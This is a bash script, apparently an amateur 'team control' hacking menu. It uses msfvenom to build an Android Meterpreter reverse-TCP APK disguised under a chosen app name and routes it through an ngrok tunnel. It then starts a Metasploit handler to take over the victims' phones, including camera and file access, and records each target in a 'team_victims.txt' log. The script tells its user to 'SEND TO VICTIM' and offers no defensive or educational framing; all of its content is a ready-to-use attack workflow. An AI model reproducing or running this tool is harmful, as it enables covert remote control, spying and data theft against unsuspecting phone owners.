#!/bin/bash

# --- XXSZMSX CO-OP EDITION (TEAM CONTROL) ---
# SHARE SESSIONS WITH YOUR FRIEND FROM ANYWHERE

R='\033[1;31m'
B='\033[1;34m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# PASSWORD SYSTEM
clear
echo -en "${W}[?] ENTER TEAM PASSWORD: ${N}"
read -s password
echo ""
if [[ $password != "mazen2014" ]]; then echo "WRONG PASSWORD"; exit 1; fi

while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ MODE ]: CO-OP TEAM CONTROL (SHARED ACCESS)"
echo -e "  [ TEAM ]: MAZEN & PARTNER"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${B}START GLOBAL TUNNEL (NGROK)${N}"
echo -e "${W}[02]${N} ${B}BUILD SHARED APK (FOR BOTH OF YOU)${N}"
echo -e "${W}[03]${N} ${R}JOIN LIVE CONTROL (SEE CAM/FILES)${N}"
echo -e "${W}[04]${N} ${G}VIEW TEAM VICTIM LOGS${N}"
echo -e "${W}[00]${N} ${W}EXIT${N}"

echo -en "\n${R}[TEAM-XXSZMSX] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] OPEN A NEW TAB AND RUN: ${W}ngrok tcp 4444${N}"
        read -p "PRESS ENTER WHEN READY..."
        ;;
    2)
        echo -e "\n${R}[*] CREATING SHARED PAYLOAD...${N}"
        read -p "NGROK HOST (e.g. 0.tcp.ngrok.io): " lh
        read -p "NGROK PORT: " lp
        read -p "APP NAME: " vname
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R -o "$vname.apk"
        # حفظ البيانات عشان صاحبك يشوفها لما يسحب الكود من GitHub
        echo "$vname | Host: $lh | Port: $lp | Date: $(date)" >> team_victims.txt
        echo -e "${B}[+] APK READY! SEND TO VICTIM.${N}"
        read -p "Press Enter..."
        ;;
    3)
        echo -e "\n${R}[!] CONNECTING TO SHARED SERVER...${N}"
        # نظام المستنت المشترك
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z"
        ;;
    4)
        echo -e "\n${B}--- SHARED TEAM LOGS ---${N}"
        cat team_victims.txt 2>/dev/null || echo "No victims yet."
        read -p "Press Enter..."
        ;;
    0) exit ;;
esac
done
